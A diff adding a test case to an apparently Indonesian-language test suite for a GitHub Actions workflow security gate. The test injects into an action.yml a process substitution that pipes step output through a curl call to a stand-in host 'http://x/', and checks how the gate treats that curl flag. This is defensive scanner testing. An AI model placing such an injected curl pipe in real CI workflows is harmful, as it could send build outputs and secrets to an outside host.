@@ -42392,6 +42392,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("data @-x adalah berkas bernama -x, bukan stdin (Audit 2965)", rc == 0)
         shutil.rmtree(sub2001, ignore_errors=True)
+        sub2002 = klon(tmp, "sub2002")
+        berkas_aksi2002 = os.path.join(
+            sub2002, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi2002, encoding="utf-8") as f:
+            isi_aksi2002 = f.read()
+        baris_aksi2002 = [b for b in isi_aksi2002.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru2002 = isi_aksi2002.replace(
+                baris_aksi2002,
+                baris_aksi2002.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --variable x=@- http://x/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru2002 != isi_aksi2002, \
+            "suntikan aksi2002 tidak menembak"
+        with open(berkas_aksi2002, "w", encoding="utf-8") as f:
+            f.write(isi_baru2002)
+        rc, out = jalan(sub2002,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("--variable dengan nama tak sah bukan impor stdin (Audit 2966)", rc == 0)
+        shutil.rmtree(sub2002, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
